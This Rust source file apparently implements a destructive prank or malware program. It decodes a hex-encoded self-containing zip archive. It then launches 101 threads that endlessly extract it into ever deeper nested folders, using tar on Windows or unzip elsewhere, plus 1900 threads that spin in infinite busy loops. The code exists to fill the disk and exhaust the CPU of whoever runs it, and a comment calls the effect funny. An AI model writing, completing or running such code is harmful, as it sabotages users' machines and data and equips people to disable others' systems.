use hex;
use std::fs;
use std::io::Write;
use std::process::Command;
use std::thread;

fn create_zip() -> Result<(), std::io::Error> {
    let to_write = "504b03041400000008000803643cf9f4896448010000b801000007000000\
722f722e7a6970002500daff504b03041400000008000803643cf9f48964\
48010000b801000007000000722f722e7a6970002f00d0ff002500daff50\
4b03041400000008000803643cf9f4896448010000b80100000700000072\
2f722e7a6970002f00d0ffc2548e5739000500faffc2548e5739000500fa\
ff000500faff001400ebffc2548e5739000500faff000500faff001400eb\
ff428821c400001400ebff428821c400001400ebff428821c400001400eb\
ff428821c400001400ebff428821c400000000ffff000000ffff003400cb\
ff428821c400000000ffff000000ffff003400cbff42e8215e0f000000ff\
ff0af066641261c015dce8a048bf48af2ab320c09b950dc4670442530606\
0640000600f9ff6d010000000042e8215e0f000000ffff0af066641261c0\
15dce8a048bf48af2ab320c09b950dc46704425306060640000600f9ff6d\
0100000000504b010214001400000008000803643cf9f4896448010000b8\
010000070000000000000000000000000000000000722f722e7a6970504b\
05060000000001000100350000006d0100000000";
    let to_write = hex::decode(to_write.trim());
    let mut file = fs::File::create("r.zip")?;
    file.write(&to_write.unwrap())?;
    Ok(())
}

fn recursive_unzip() {
    let path = std::env::current_dir().unwrap().display().to_string();
    if cfg!(target_os = "windows") {
        for i in 0..=100 {
            let pathclone = path.clone();
            thread::spawn(move || bad_thread_unzip(pathclone, i));
        }
        for _ in 0..1900 {
            thread::spawn(|| loop {});
        }
    } else {
        for i in 0..=100 {
            let pathclone = path.clone();
            thread::spawn(move || thread_unzip(pathclone, i));
        }
        for _ in 0..1900 {
            thread::spawn(|| loop {});
        }
    }
}

fn bad_thread_unzip(path: String, num: u16) {
    const SEP: &str = std::path::MAIN_SEPARATOR_STR;
    let mut path = path;
    loop {
        let newfolder: String = path.to_string() + SEP + "r" + num.to_string().as_str();
        let _ = fs::create_dir(&newfolder);
        let mut unzip = Command::new("tar");
        let _ = unzip
            .arg("-xf")
            .arg(path.to_string() + SEP + "r.zip")
            .arg("-C")
            .arg(&newfolder)
            .output();
        let innerfolder = newfolder.clone() + SEP + "r";
        let _ = fs::rename(
            innerfolder.to_string() + SEP + "r.zip",
            newfolder.to_string() + SEP + "r.zip",
        );
        let _ = fs::remove_dir(&innerfolder);
        path = newfolder.clone();
    }
    //recursive thread creation does not really work because the file isnt deep enough, it's less
    //funny
    /*for i in 0..=1 {
        let pathclone = newfolder.clone();
        thread::spawn(move || bad_thread_unzip(pathclone, i));
    }*/
}

fn thread_unzip(path: String, num: u16) {
    let mut path = path;
    loop {
        let newfolder: String = path.to_string() + "/r" + num.to_string().as_str();
        let mut unzip = Command::new("unzip");
        let _ = unzip
            .arg("-oj")
            .arg(path.to_string() + "/r.zip")
            .arg("-d")
            .arg(&newfolder)
            .output();
        path = newfolder.clone();
    }
    /*for i in 0..=1 {
        let pathclone = newfolder.clone();
        thread::spawn(move || thread_unzip(pathclone, i));
    }
    */
}
